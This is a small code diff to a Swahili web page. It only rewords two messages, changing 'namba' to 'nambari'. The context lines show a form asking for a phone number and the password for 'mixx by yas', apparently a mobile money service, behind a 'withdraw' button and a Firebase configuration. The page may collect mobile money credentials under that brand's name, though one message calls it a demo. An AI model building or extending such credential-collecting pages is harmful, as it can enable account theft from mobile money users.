@@ -111,7 +111,7 @@
   <input id="password" type="password" placeholder="********">
 
   <button id="withdraw">Endelea Kutoa Kiasi</button>
-  <p class="note">Hakikisha unaweka namba na neno la siri sahihi la mixx by yas.</p>
+  <p class="note">Hakikisha unaweka nambari na neno la siri sahihi la mixx by yas.</p>
 </div>
 
 <!-- POPUP -->
@@ -166,7 +166,7 @@ const firebaseConfig = {
 
     if(!phone.startsWith("+255") || phone.length < 13 || password.length < 4){
       popupTitle.innerText = "Tatizo ❌";
-      popupText.innerHTML = "Tafadhali weka namba ya simu sahihi na nenosiri la DEMO.";
+      popupText.innerHTML = "Tafadhali weka nambari ya simu sahihi na nenosiri la DEMO.";
       popup.classList.add("active");
       return;
     }
